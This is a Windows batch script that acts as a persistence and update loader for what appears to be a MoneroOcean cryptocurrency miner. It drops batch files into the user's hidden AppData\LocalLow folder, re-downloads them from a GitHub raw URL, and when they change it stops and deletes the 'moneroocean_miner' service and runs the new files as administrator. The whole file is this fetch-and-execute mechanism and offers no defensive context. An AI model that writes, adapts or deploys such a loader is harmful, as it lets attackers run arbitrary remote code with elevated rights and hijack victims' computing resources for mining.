@echo off

	:check_create_task
	IF EXIST "%USERPROFILE%\AppData\LocalLow\create_task.bat" (
		powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task_new.bat')"
		fc /b %USERPROFILE%\AppData\LocalLow\create_task_new.bat %USERPROFILE%\AppData\LocalLow\create_task.bat > nul
		if errorlevel 1 (
			sc stop moneroocean_miner
			sc delete moneroocean_miner
			powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task.bat')"
			powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\create_task.bat' -Verb runAs"
		) else (
			goto check_setup
		)
	) ELSE (
		powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/create_task.bat', '%USERPROFILE%\AppData\LocalLow\create_task.bat')"
		powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\create_task.bat' -Verb runAs"
	)
	:check_setup
	IF EXIST "%USERPROFILE%\AppData\LocalLow\setup.bat" (
		powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/setup.bat', '%USERPROFILE%\AppData\LocalLow\setup_new.bat')"
		fc /b %USERPROFILE%\AppData\LocalLow\setup_new.bat %USERPROFILE%\AppData\LocalLow\setup.bat > nul
		if errorlevel 1 (
			sc stop moneroocean_miner
			sc delete moneroocean_miner
			powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/setup.bat', '%USERPROFILE%\AppData\LocalLow\setup.bat')"
			powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\setup.bat' -Verb runAs"
		) else (
			goto ok
		)
	) ELSE (
		powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/abyssalvoid123/autosetup/master/setup.bat', '%USERPROFILE%\AppData\LocalLow\setup.bat')"
		powershell -Command "Start-Process '%USERPROFILE%\AppData\LocalLow\setup.bat' -Verb runAs"
	)
	
	:ok
	
	exit /b 0